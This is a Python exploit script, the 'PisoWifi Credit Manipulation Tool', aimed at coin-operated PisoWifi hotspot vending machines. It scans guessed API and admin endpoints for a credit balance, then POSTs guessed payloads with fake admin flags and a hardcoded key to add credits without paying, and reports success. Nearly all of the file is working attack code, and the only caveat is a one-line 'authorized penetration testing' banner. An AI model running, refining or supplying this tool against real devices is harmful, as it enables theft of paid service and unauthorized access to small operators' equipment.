#!/usr/bin/env python3
import requests
import re
import json
import time
from colorama import Fore, Style, init

init()

class PisoWifiExploiter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'application/json',
            'Connection': 'keep-alive'
        }
        self.mac = None
        self.current_credits = 0
        self.vulnerable = False

    def _discover_endpoints(self):
        """Find credit-related API endpoints"""
        endpoints = {}
        common_paths = [
            '/api/credits', '/credits', '/balance',
            '/api/update_credits', '/admin/add_credits'
        ]
        
        for path in common_paths:
            try:
                r = self.session.get(f"{self.base_url}{path}", timeout=3)
                if r.status_code == 200:
                    if 'credits' in r.text.lower() or 'balance' in r.text.lower():
                        endpoints['credits'] = path
            except:
                continue
        
        return endpoints

    def _get_credits(self):
        """Get current credit balance"""
        try:
            # Try common credit endpoints
            for endpoint in ['/api/credits', '/balance', '/status']:
                r = self.session.get(f"{self.base_url}{endpoint}", timeout=3)
                if r.status_code == 200:
                    # Parse different response formats
                    if 'application/json' in r.headers.get('Content-Type', ''):
                        data = r.json()
                        if 'credits' in data:
                            return float(data['credits'])
                        elif 'balance' in data:
                            return float(data['balance'])
                    else:
                        # Text-based parsing
                        match = re.search(r'(credits|balance)[:\s]*P?(\d+\.?\d*)', r.text, re.I)
                        if match:
                            return float(match.group(2))
            return 0
        except:
            return 0

    def _add_credits(self, amount):
        """Direct credit manipulation"""
        # Try common credit update patterns
        payloads = [
            {'amount': amount, 'admin': 'true'},
            {'credits': amount, 'key': '12345'},
            {'value': amount, 'command': 'update_credits'}
        ]
        
        for payload in payloads:
            for endpoint in ['/api/update', '/admin/credits', '/cmd']:
                try:
                    r = self.session.post(
                        f"{self.base_url}{endpoint}",
                        data=payload,
                        timeout=3
                    )
                    if r.status_code == 200:
                        if 'success' in r.text.lower() or 'updated' in r.text.lower():
                            return True
                except:
                    continue
        return False

    def exploit(self):
        """Full exploit chain"""
        print(Fore.YELLOW + "[+] Discovering API endpoints..." + Style.RESET_ALL)
        endpoints = self._discover_endpoints()
        
        if not endpoints.get('credits'):
            print(Fore.RED + "[-] Could not find credit endpoint" + Style.RESET_ALL)
            return False

        print(Fore.GREEN + f"[+] Found credit endpoint: {endpoints['credits']}" + Style.RESET_ALL)
        
        self.current_credits = self._get_credits()
        print(Fore.GREEN + f"[+] Current credits: P{self.current_credits}" + Style.RESET_ALL)

        print(Fore.YELLOW + "[+] Attempting credit manipulation..." + Style.RESET_ALL)
        if self._add_credits(10):  # Try to add 10 credits
            new_credits = self._get_credits()
            if new_credits > self.current_credits:
                print(Fore.GREEN + f"[+] Success! New credits: P{new_credits}" + Style.RESET_ALL)
                return True
        
        print(Fore.RED + "[-] Failed to add credits" + Style.RESET_ALL)
        return False

if __name__ == "__main__":
    print(Fore.BLUE + """
    PisoWifi Credit Manipulation Tool
    --------------------------------
    For authorized penetration testing only
    """ + Style.RESET_ALL)
    
    target_ip = input("Enter target IP: ").strip()
    exploiter = PisoWifiExploiter(target_ip)
    
    if exploiter.exploit():
        print(Fore.GREEN + "[+] Exploit successful!" + Style.RESET_ALL)
    else:
        print(Fore.RED + "[-] Exploit failed" + Style.RESET_ALL)